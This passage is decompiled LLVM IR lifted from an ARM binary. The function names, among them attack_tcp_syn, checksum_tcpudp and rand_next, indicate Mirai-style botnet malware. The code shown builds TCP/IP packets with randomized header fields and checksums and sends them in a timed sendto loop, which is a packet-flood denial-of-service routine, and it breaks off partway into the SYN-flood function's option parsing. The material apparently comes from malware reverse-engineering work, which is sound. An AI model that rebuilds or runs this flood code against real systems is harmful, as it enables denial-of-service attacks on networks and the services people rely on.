  %v2_c0b4 = icmp eq i32 %v6_bdbc, -1
  %v7_c0b4 = icmp eq i32 %v6_bdbc, -1
  %v3_c228 = icmp eq i32 %v3_be2c, 65535
  %v2_c28c = icmp eq i32 %v1_bda8, 0
  br label %dec_label_pc_c078

dec_label_pc_c078:                                ; preds = %dec_label_pc_c078.preheader, %dec_label_pc_c2b4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 %v2_be38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_be38, label %dec_label_pc_c2b4, label %dec_label_pc_c08c

dec_label_pc_c08c:                                ; preds = %dec_label_pc_c078
  %v0_c08c = load i32, i32* @r8, align 4
  %v3_c08c = mul i32 %v0_c08c, 65536
  %v1_c090 = add i32 %v3_c08c, 1310720
  store i32 %v1_c090, i32* %r2.global-to-local, align 4
  %tmp69 = udiv i32 %v1_c090, 256
  %v3_c098 = and i32 %tmp69, 65280
  store i32 %v3_c098, i32* %r3.global-to-local, align 4
  %v4_c09c = udiv i32 %v1_c090, 16777216
  %v5_c09c = or i32 %v3_c098, %v4_c09c
  store i32 %v5_c09c, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_c0a4 = add i32 %v0_c08c, 20
  store i32 %v1_c0a4, i32* @sb, align 4
  %v1_c0a8 = add i32 %v0_c08c, 40
  store i32 %v1_c0a8, i32* @sl, align 4
  br label %dec_label_pc_c194

dec_label_pc_c0b0:                                ; preds = %dec_label_pc_c194
  store i32 %v6_bdbc, i32* %r0.global-to-local, align 4
  store i1 %v7_c0b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c0b4, label %dec_label_pc_c218, label %dec_label_pc_c0bc

dec_label_pc_c0bc:                                ; preds = %dec_label_pc_c1b8, %dec_label_pc_c0b0
  store i32 %v3_be2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c228, label %dec_label_pc_c234, label %dec_label_pc_c0d0

dec_label_pc_c0d0:                                ; preds = %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge, %dec_label_pc_c0bc
  %v1_c0d4 = phi i32 [ %v1_c0d4.pre, %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge ], [ 65535, %dec_label_pc_c0bc ]
  store i32 %v3_be30, i32* %r2.global-to-local, align 4
  %v9_c0d4 = icmp eq i32 %v3_be30, %v1_c0d4
  store i1 %v9_c0d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0d4, label %dec_label_pc_c248, label %dec_label_pc_c0dc

dec_label_pc_c0dc:                                ; preds = %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge, %dec_label_pc_c0d0
  %v1_c0e0 = phi i32 [ %v1_c0e0.pre, %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge ], [ %v1_c0d4, %dec_label_pc_c0d0 ]
  store i32 %v3_be34, i32* %r3.global-to-local, align 4
  %v9_c0e0 = icmp eq i32 %v3_be34, %v1_c0e0
  store i1 %v9_c0e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0e0, label %dec_label_pc_c25c, label %dec_label_pc_c0e8

dec_label_pc_c0e8:                                ; preds = %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge, %dec_label_pc_c0dc
  %v1_c0ec = phi i32 [ %v1_c0ec.pre, %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge ], [ %v1_c0e0, %dec_label_pc_c0dc ]
  store i32 %v5_bcbc, i32* %ip.global-to-local, align 4
  %v9_c0ec = icmp eq i32 %v5_bcbc, %v1_c0ec
  store i1 %v9_c0ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0ec, label %dec_label_pc_c270, label %dec_label_pc_c0f4

dec_label_pc_c0f4:                                ; preds = %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge, %dec_label_pc_c0e8
  %v1_c0f8 = phi i32 [ %v1_c0f8.pre, %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge ], [ %v1_c0ec, %dec_label_pc_c0e8 ]
  store i32 %v6_bcd8, i32* %r0.global-to-local, align 4
  %v9_c0f8 = icmp eq i32 %v6_bcd8, %v1_c0f8
  store i1 %v9_c0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0f8, label %dec_label_pc_c284, label %dec_label_pc_c100

dec_label_pc_c100:                                ; preds = %dec_label_pc_c270, %dec_label_pc_c0f4
  store i32 %v1_bda8, i32* %r1.global-to-local, align 4
  store i1 %v2_c28c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c28c, label %dec_label_pc_c10c, label %dec_label_pc_c298

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c284, %dec_label_pc_c298
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c110 = load i32, i32* @r5, align 4
  %v3_c110 = add i32 %v2_c110, 10
  %v4_c110 = inttoptr i32 %v3_c110 to i16*
  store i16 0, i16* %v4_c110, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c118 = load i32, i32* @r5, align 4
  store i32 %v0_c118, i32* @r0, align 4
  %v2_c11c = call i32 @checksum_generic(i32 %v0_c118, i32 20)
  %v3_c11c = trunc i32 %v2_c11c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c124 = load i32, i32* @r5, align 4
  %v4_c124 = add i32 %v3_c124, 10
  %v5_c124 = inttoptr i32 %v4_c124 to i16*
  store i16 %v3_c11c, i16* %v5_c124, align 2
  %v0_c128 = load i32, i32* @r6, align 4
  store i32 %v0_c128, i32* @r1, align 4
  %v0_c12c = load i32, i32* %r3.global-to-local, align 4
  %v1_c12c = trunc i32 %v0_c12c to i16
  %v3_c12c = add i32 %v0_c128, 16
  %v4_c12c = inttoptr i32 %v3_c12c to i16*
  store i16 %v1_c12c, i16* %v4_c12c, align 2
  %v0_c130 = load i32, i32* @fp, align 4
  store i32 %v0_c130, i32* %r2.global-to-local, align 4
  %v0_c134 = load i32, i32* @sb, align 4
  store i32 %v0_c134, i32* %r3.global-to-local, align 4
  %v0_c138 = load i32, i32* @r5, align 4
  store i32 %v0_c138, i32* %r0.global-to-local, align 4
  %v4_c13c = call i32 @checksum_tcpudp(i32 %v0_c138, i32 %v0_c128, i32 %v0_c130, i32 %v0_c134)
  %v5_c13c = trunc i32 %v4_c13c to i16
  store i32 %v4_c13c, i32* %r0.global-to-local, align 4
  %v3_c140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c140, i32* %r3.global-to-local, align 4
  %v3_c144 = mul i32 %v3_c140, 32
  store i32 %v3_c144, i32* %lr.global-to-local, align 4
  %v3_c148 = load i32, i32* @r6, align 4
  %v4_c148 = add i32 %v3_c148, 16
  %v5_c148 = inttoptr i32 %v4_c148 to i16*
  store i16 %v5_c13c, i16* %v5_c148, align 2
  %v0_c14c = load i32, i32* %lr.global-to-local, align 4
  %v1_c14c = load i32, i32* %r3.global-to-local, align 4
  %tmp73 = mul i32 %v1_c14c, -8
  %v5_c14c = add i32 %v0_c14c, %tmp73
  store i32 %v5_c14c, i32* %lr.global-to-local, align 4
  %v0_c150 = load i32, i32* @r6, align 4
  %v1_c150 = add i32 %v0_c150, 2
  %v2_c150 = inttoptr i32 %v1_c150 to i16*
  %v3_c150 = load i16, i16* %v2_c150, align 2
  %v4_c150 = zext i16 %v3_c150 to i32
  store i32 %v4_c150, i32* @r6, align 4
  %v1_c154 = load i32, i32* @r7, align 4
  %v2_c154 = add i32 %v1_c154, %v5_c14c
  store i32 %v2_c154, i32* @lr, align 4
  %v3_c158 = add i32 %v2_c154, 2
  %v4_c158 = inttoptr i32 %v3_c158 to i16*
  store i16 %v3_c150, i16* %v4_c158, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c164 = load i32, i32* @r5, align 4
  store i32 %v0_c164, i32* %r1.global-to-local, align 4
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v0_c16c = load i32, i32* @sl, align 4
  store i32 %v0_c16c, i32* %r2.global-to-local, align 4
  %v0_c174 = load i32, i32* @lr, align 4
  %v6_c178 = call i32 @__libc_sendto(i32 %v3_bde0, i32 %v0_c164, i32 %v0_c16c, i32 16384, i32 %v0_c174, i32 16)
  %v3_c17c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c17c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_c184 = add i32 %v3_c17c, 1
  store i32 %v1_c184, i32* %r0.global-to-local, align 4
  %v9_c188 = icmp eq i32 %v1_c184, %arg2
  store i1 %v9_c188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c184, i32* %stack_var_-44, align 4
  %v6_c190 = icmp slt i32 %v1_c184, %arg2
  br i1 %v6_c190, label %dec_label_pc_c194, label %dec_label_pc_c2b4

dec_label_pc_c194:                                ; preds = %dec_label_pc_c10c, %dec_label_pc_c08c
  %v1_c1a8 = phi i32 [ %v1_c184, %dec_label_pc_c10c ], [ 0, %dec_label_pc_c08c ]
  %v5_c198 = mul i32 %v1_c1a8, 24
  %v1_c19c = load i32, i32* @r7, align 4
  %v2_c19c = add i32 %v1_c19c, %v5_c198
  store i32 %v2_c19c, i32* %r3.global-to-local, align 4
  store i32 %v2_bbec, i32* %ip.global-to-local, align 4
  %v1_c1a4 = add i32 %v2_c19c, 20
  %v2_c1a4 = inttoptr i32 %v1_c1a4 to i8*
  %v3_c1a4 = load i8, i8* %v2_c1a4, align 1
  %v4_c1a4 = zext i8 %v3_c1a4 to i32
  store i32 %v4_c1a4, i32* %r2.global-to-local, align 4
  %v4_c1a8 = mul i32 %v1_c1a8, 4
  %v5_c1a8 = add i32 %v4_c1a8, %v2_bbec
  %v6_c1a8 = inttoptr i32 %v5_c1a8 to i32*
  %v7_c1a8 = load i32, i32* %v6_c1a8, align 4
  store i32 %v7_c1a8, i32* @r5, align 4
  %v2_c1ac = icmp ugt i8 %v3_c1a4, 30
  %v7_c1ac = icmp eq i8 %v3_c1a4, 31
  store i1 %v7_c1ac, i1* %cpsr_z.global-to-local, align 1
  %v1_c1b0 = add i32 %v7_c1a8, 20
  store i32 %v1_c1b0, i32* @r6, align 4
  %v2_c1b4 = xor i1 %v7_c1ac, true
  %v3_c1b4 = and i1 %v2_c1ac, %v2_c1b4
  br i1 %v3_c1b4, label %dec_label_pc_c0b0, label %dec_label_pc_c1b8

dec_label_pc_c1b8:                                ; preds = %dec_label_pc_c194
  %v1_c1b8 = add i32 %v2_c19c, 16
  %v2_c1b8 = inttoptr i32 %v1_c1b8 to i32*
  %v3_c1b8 = load i32, i32* %v2_c1b8, align 4
  %v0_c1bc = call i32 @rand_next()
  store i32 %v0_c1bc, i32* %r0.global-to-local, align 4
  %v3_c1c0 = load i32, i32* %stack_var_-44, align 4
  %v5_c1c8 = mul i32 %v3_c1c0, 24
  %v1_c1cc = and i32 %v3_c1b8, 16711680
  store i32 %v1_c1cc, i32* %ip.global-to-local, align 4
  %v3_c1d0 = udiv i32 %v3_c1b8, 16777216
  %v4_c1d4 = udiv i32 %v1_c1cc, 256
  %v5_c1d4 = or i32 %v4_c1d4, %v3_c1d0
  store i32 %v5_c1d4, i32* %r2.global-to-local, align 4
  %v1_c1d8 = load i32, i32* @r7, align 4
  %v2_c1d8 = add i32 %v1_c1d8, %v5_c1c8
  store i32 %v2_c1d8, i32* %r1.global-to-local, align 4
  %v1_c1dc = and i32 %v3_c1b8, 65280
  store i32 %v1_c1dc, i32* %r3.global-to-local, align 4
  %v1_c1e0 = add i32 %v2_c1d8, 20
  %v2_c1e0 = inttoptr i32 %v1_c1e0 to i8*
  %v3_c1e0 = load i8, i8* %v2_c1e0, align 1
  %v4_c1e0 = zext i8 %v3_c1e0 to i32
  store i32 %v4_c1e0, i32* %ip.global-to-local, align 4
  %v5_c1e8 = call i32 @llvm.bswap.i32(i32 %v3_c1b8)
  %v7_c1ec = lshr i32 %v0_c1bc, %v4_c1e0
  %v8_c1ec = add i32 %v7_c1ec, %v5_c1e8
  store i32 %v8_c1ec, i32* %r2.global-to-local, align 4
  %v1_c1fc = and i32 %v8_c1ec, 65280
  store i32 %v1_c1fc, i32* %r1.global-to-local, align 4
  store i32 %v6_bdbc, i32* %r0.global-to-local, align 4
  %v5_c208 = call i32 @llvm.bswap.i32(i32 %v8_c1ec)
  store i32 %v5_c208, i32* %r3.global-to-local, align 4
  store i1 %v7_c0b4, i1* %cpsr_z.global-to-local, align 1
  %v1_c210 = load i32, i32* @r5, align 4
  %v2_c210 = add i32 %v1_c210, 16
  %v3_c210 = inttoptr i32 %v2_c210 to i32*
  store i32 %v5_c208, i32* %v3_c210, align 4
  br i1 %v2_c0b4, label %dec_label_pc_c218, label %dec_label_pc_c0bc

dec_label_pc_c218:                                ; preds = %dec_label_pc_c1b8, %dec_label_pc_c0b0
  %v0_c218 = call i32 @rand_next()
  store i32 %v0_c218, i32* %r0.global-to-local, align 4
  store i32 %v3_be2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c228, i1* %cpsr_z.global-to-local, align 1
  %v1_c22c = load i32, i32* @r5, align 4
  %v2_c22c = add i32 %v1_c22c, 12
  %v3_c22c = inttoptr i32 %v2_c22c to i32*
  store i32 %v0_c218, i32* %v3_c22c, align 4
  br i1 %v3_c228, label %dec_label_pc_c234, label %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge

dec_label_pc_c218.dec_label_pc_c0d0_crit_edge:    ; preds = %dec_label_pc_c218
  %v1_c0d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0d0

dec_label_pc_c234:                                ; preds = %dec_label_pc_c218, %dec_label_pc_c0bc
  %v0_c234 = call i32 @rand_next()
  %v1_c234 = trunc i32 %v0_c234 to i16
  store i32 %v0_c234, i32* %r0.global-to-local, align 4
  store i32 %v3_be30, i32* %r2.global-to-local, align 4
  %v1_c23c = load i32, i32* @r4, align 4
  %v9_c23c = icmp eq i32 %v3_be30, %v1_c23c
  store i1 %v9_c23c, i1* %cpsr_z.global-to-local, align 1
  %v3_c240 = load i32, i32* @r5, align 4
  %v4_c240 = add i32 %v3_c240, 4
  %v5_c240 = inttoptr i32 %v4_c240 to i16*
  store i16 %v1_c234, i16* %v5_c240, align 2
  br i1 %v9_c23c, label %dec_label_pc_c248, label %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge

dec_label_pc_c234.dec_label_pc_c0dc_crit_edge:    ; preds = %dec_label_pc_c234
  %v1_c0e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0dc

dec_label_pc_c248:                                ; preds = %dec_label_pc_c234, %dec_label_pc_c0d0
  %v0_c248 = call i32 @rand_next()
  %v1_c248 = trunc i32 %v0_c248 to i16
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  store i32 %v3_be34, i32* %r3.global-to-local, align 4
  %v1_c250 = load i32, i32* @r4, align 4
  %v9_c250 = icmp eq i32 %v3_be34, %v1_c250
  store i1 %v9_c250, i1* %cpsr_z.global-to-local, align 1
  %v3_c254 = load i32, i32* @r5, align 4
  %v4_c254 = add i32 %v3_c254, 20
  %v5_c254 = inttoptr i32 %v4_c254 to i16*
  store i16 %v1_c248, i16* %v5_c254, align 2
  br i1 %v9_c250, label %dec_label_pc_c25c, label %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge

dec_label_pc_c248.dec_label_pc_c0e8_crit_edge:    ; preds = %dec_label_pc_c248
  %v1_c0ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0e8

dec_label_pc_c25c:                                ; preds = %dec_label_pc_c248, %dec_label_pc_c0dc
  %v0_c25c = call i32 @rand_next()
  %v1_c25c = trunc i32 %v0_c25c to i16
  store i32 %v0_c25c, i32* %r0.global-to-local, align 4
  store i32 %v5_bcbc, i32* %ip.global-to-local, align 4
  %v1_c264 = load i32, i32* @r4, align 4
  %v9_c264 = icmp eq i32 %v5_bcbc, %v1_c264
  store i1 %v9_c264, i1* %cpsr_z.global-to-local, align 1
  %v3_c268 = load i32, i32* @r6, align 4
  %v4_c268 = add i32 %v3_c268, 2
  %v5_c268 = inttoptr i32 %v4_c268 to i16*
  store i16 %v1_c25c, i16* %v5_c268, align 2
  br i1 %v9_c264, label %dec_label_pc_c270, label %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge

dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge:    ; preds = %dec_label_pc_c25c
  %v1_c0f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0f4

dec_label_pc_c270:                                ; preds = %dec_label_pc_c25c, %dec_label_pc_c0e8
  %v0_c270 = call i32 @rand_next()
  %v1_c274 = load i32, i32* @r6, align 4
  %v2_c274 = add i32 %v1_c274, 4
  %v3_c274 = inttoptr i32 %v2_c274 to i32*
  store i32 %v0_c270, i32* %v3_c274, align 4
  store i32 %v6_bcd8, i32* %r0.global-to-local, align 4
  %v1_c27c = load i32, i32* @r4, align 4
  %v9_c27c = icmp eq i32 %v6_bcd8, %v1_c27c
  store i1 %v9_c27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c27c, label %dec_label_pc_c284, label %dec_label_pc_c100

dec_label_pc_c284:                                ; preds = %dec_label_pc_c270, %dec_label_pc_c0f4
  %v0_c284 = call i32 @rand_next()
  store i32 %v0_c284, i32* %r0.global-to-local, align 4
  store i32 %v1_bda8, i32* %r1.global-to-local, align 4
  store i1 %v2_c28c, i1* %cpsr_z.global-to-local, align 1
  %v1_c290 = load i32, i32* @r6, align 4
  %v2_c290 = add i32 %v1_c290, 8
  %v3_c290 = inttoptr i32 %v2_c290 to i32*
  store i32 %v0_c284, i32* %v3_c290, align 4
  br i1 %v2_c28c, label %dec_label_pc_c10c, label %dec_label_pc_c298

dec_label_pc_c298:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c284
  %v0_c298 = load i32, i32* @r5, align 4
  %v1_c298 = add i32 %v0_c298, 40
  store i32 %v1_c298, i32* @r4, align 4
  store i32 %v1_c298, i32* %r0.global-to-local, align 4
  %v0_c2a0 = load i32, i32* @r8, align 4
  store i32 %v0_c2a0, i32* %r1.global-to-local, align 4
  %v2_c2a4 = call i32 @rand_alphastr(i32 %v1_c298, i32 %v0_c2a0)
  store i32 %v2_c2a4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c2ac = load i32, i32* @r4, align 4
  %v3_c2ac = load i32, i32* @r8, align 4
  %v4_c2ac = add i32 %v3_c2ac, %v2_c2ac
  %v5_c2ac = inttoptr i32 %v4_c2ac to i8*
  store i8 0, i8* %v5_c2ac, align 1
  br label %dec_label_pc_c10c

dec_label_pc_c2b4:                                ; preds = %dec_label_pc_c10c, %dec_label_pc_c078
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c2b8 = call i32 @__GI_time(i32* null)
  store i32 %v2_c2b8, i32* %r0.global-to-local, align 4
  store i32 %v2_bdcc, i32* %r1.global-to-local, align 4
  %v9_c2c0 = icmp eq i32 %v2_bdcc, %v2_c2b8
  store i1 %v9_c2c0, i1* %cpsr_z.global-to-local, align 1
  %v6_c2c4 = icmp slt i32 %v2_bdcc, %v2_c2b8
  br i1 %v6_c2c4, label %dec_label_pc_c2c8, label %dec_label_pc_c078

dec_label_pc_c2c8:                                ; preds = %dec_label_pc_c2b4, %entry, %dec_label_pc_c2d4
  %v1_c2d0 = phi i32 [ %v3_bde0, %entry ], [ %v1_c2d8, %dec_label_pc_c2d4 ], [ %v2_c2b8, %dec_label_pc_c2b4 ]
  store i32 %v18_bbc0, i32* %sb.global-to-local, align 4
  store i32 %v24_bbc0, i32* %fp.global-to-local, align 4
  store i32 %v27_bbc0, i32* %lr.global-to-local, align 4
  ret i32 %v1_c2d0

dec_label_pc_c2d4:                                ; preds = %dec_label_pc_bdf0
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v1_c2d8 = call i32 @__GI___libc_close(i32 %v3_bde0)
  store i32 %v1_c2d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c2c8

; uselistorder directives
  uselistorder i32 %v1_c2d8, { 1, 0 }
  uselistorder i32 %v0_c25c, { 1, 0 }
  uselistorder i32 %v0_c248, { 1, 0 }
  uselistorder i32 %v0_c234, { 1, 0 }
  uselistorder i32 %v5_c208, { 1, 0 }
  uselistorder i32 %v3_c1b8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c184, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_c14c, { 1, 0 }
  uselistorder i32 %v4_c13c, { 1, 0 }
  uselistorder i32 %v0_c08c, { 2, 1, 0 }
  uselistorder i1 %v2_c28c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c228, { 1, 0, 2, 3 }
  uselistorder i1 %v7_c0b4, { 2, 1, 0 }
  uselistorder i32 %v1_c064, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c034, { 1, 0 }
  uselistorder i32 %v0_bfa0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_bec8, { 2, 0, 1 }
  uselistorder i32 %v1_bec4, { 2, 0, 1 }
  uselistorder i32 %v1_beb4, { 1, 0 }
  uselistorder i1 %v2_be38, { 1, 0, 2, 3 }
  uselistorder i32 %v3_be2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_be28, { 1, 0, 3, 2 }
  uselistorder i32 %v0_be24, { 1, 0, 2 }
  uselistorder i1 %v7_be10, { 1, 0 }
  uselistorder i1 %v7_bde4, { 1, 0 }
  uselistorder i32 %v3_bde0, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_bdcc, { 2, 1, 0 }
  uselistorder i32 %v6_bdbc, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_bda8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bd20, { 0, 2, 1 }
  uselistorder i32 %v6_bcd8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bcbc, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bc6c, { 1, 0 }
  uselistorder i32 %v1_bc48, { 1, 0 }
  uselistorder i32 %v6_bc40, { 1, 0 }
  uselistorder i32 %v7_bc28, { 1, 0, 2, 3 }
  uselistorder i8 %v5_bc24, { 1, 0 }
  uselistorder i32 %v6_bc04, { 1, 0 }
  uselistorder i32 %v2_bbec, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 47, 46, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 7, 5, 8, 6, 9, 10, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20, 21, 23, 22, 29, 24, 25, 26, 27, 28, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 3, 2, 1, 0, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_c2c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c298, { 1, 0 }
  uselistorder label %dec_label_pc_c10c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c078, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c2e4 = load i32, i32* @r4, align 4
  %v24_c2e4 = load i32, i32* @fp, align 4
  %v27_c2e4 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_c310 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_c314 = load i32, i32* @r4, align 4
  store i32 %v0_c314, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c310, i32* @sl, align 4
  %v0_c324 = load i32, i32* @r5, align 4
  store i32 %v0_c324, i32* %r0.global-to-local, align 4
  %v4_c328 = inttoptr i32 %v0_c314 to i32*
  %v5_c328 = call i32 @attack_get_opt_int(i32 %v0_c324, i32* %v4_c328, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c340 = load i32, i32* @r4, align 4
  store i32 %v0_c340, i32* %r1.global-to-local, align 4
  %v0_c344 = load i32, i32* @r5, align 4
  store i32 %v0_c344, i32* %r0.global-to-local, align 4
  %v5_c348 = trunc i32 %v5_c328 to i8
  %v6_c34c = inttoptr i32 %v0_c340 to i32*
  %v7_c34c = call i32 @attack_get_opt_int(i32 %v0_c344, i32* %v6_c34c, i32 3, i32 65535)
  %v0_c350 = load i32, i32* @r4, align 4
  store i32 %v0_c350, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c360 = load i32, i32* @r5, align 4
  store i32 %v0_c360, i32* %r0.global-to-local, align 4
  %v5_c364 = inttoptr i32 %v0_c350 to i32*
  %v6_c364 = call i32 @attack_get_opt_int(i32 %v0_c360, i32* %v5_c364, i32 4, i32 64)
  %v1_c36c = urem i32 %v6_c364, 256
  %v0_c370 = load i32, i32* @r4, align 4
  store i32 %v0_c370, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c37c = load i32, i32* @r5, align 4
  store i32 %v0_c37c, i32* %r0.global-to-local, align 4
  %v6_c384 = inttoptr i32 %v0_c370 to i32*
  %v7_c384 = call i32 @attack_get_opt_int(i32 %v0_c37c, i32* %v6_c384, i32 5, i32 1)
  %v1_c390 = urem i32 %v7_c384, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c39c = load i32, i32* @r4, align 4
  store i32 %v0_c39c, i32* %r1.global-to-local, align 4
  %v0_c3a0 = load i32, i32* @r5, align 4
  store i32 %v0_c3a0, i32* %r0.global-to-local, align 4
  %v5_c3a8 = inttoptr i32 %v0_c39c to i32*
  %v6_c3a8 = call i32 @attack_get_opt_int(i32 %v0_c3a0, i32* %v5_c3a8, i32 6, i32 65535)
  %v0_c3b4 = load i32, i32* @r4, align 4
  store i32 %v0_c3b4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c3c0 = load i32, i32* @r5, align 4
  store i32 %v0_c3c0, i32* %r0.global-to-local, align 4
  %v5_c3c4 = inttoptr i32 %v0_c3b4 to i32*
  %v6_c3c4 = call i32 @attack_get_opt_int(i32 %v0_c3c0, i32* %v5_c3c4, i32 7, i32 65535)
  %v0_c3cc = load i32, i32* @r4, align 4
  store i32 %v0_c3cc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v6_c3c4, i32* %fp.global-to-local, align 4
  %v0_c3dc = load i32, i32* @r5, align 4
  store i32 %v0_c3dc, i32* %r0.global-to-local, align 4
  %v4_c3e0 = inttoptr i32 %v0_c3cc to i32*
